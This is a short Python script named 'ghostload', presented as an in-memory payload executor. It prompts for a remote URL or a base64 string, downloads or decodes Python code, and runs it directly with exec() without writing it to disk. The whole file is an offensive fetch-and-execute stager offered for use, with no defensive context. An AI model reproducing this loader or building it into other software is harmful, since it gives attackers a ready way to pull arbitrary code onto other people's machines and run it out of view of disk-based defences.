# ghostload.py — In-Memory Payload Executor
import base64
import requests
from rich import print
from rich.panel import Panel
from rich.prompt import Prompt

def _exec_payload(code):
    try:
        exec(code, {'__builtins__': __builtins__})
    except Exception as e:
        print(f"[red]Execution failed:[/red] {e}")

def load_payload_from_url(url):
    try:
        res = requests.get(url, timeout=5)
        res.raise_for_status()
        _exec_payload(res.text)
    except Exception as e:
        print(f"[red]Remote load error:[/red] {e}")

def load_payload_from_b64(b64data):
    try:
        code = base64.b64decode(b64data.encode()).decode()
        _exec_payload(code)
    except Exception as e:
        print(f"[red]Base64 load error:[/red] {e}")

def run():
    print(Panel("📦 [bold magenta]GHOSTLOAD[/bold magenta] — In-Memory Payload Executor"))
    choice = Prompt.ask("Payload source?", choices=["url", "b64"], default="url")
    if choice == "url":
        url = Prompt.ask("Remote URL")
        load_payload_from_url(url)
    elif choice == "b64":
        b64data = Prompt.ask("Base64 Payload")
        load_payload_from_b64(b64data)


main = run
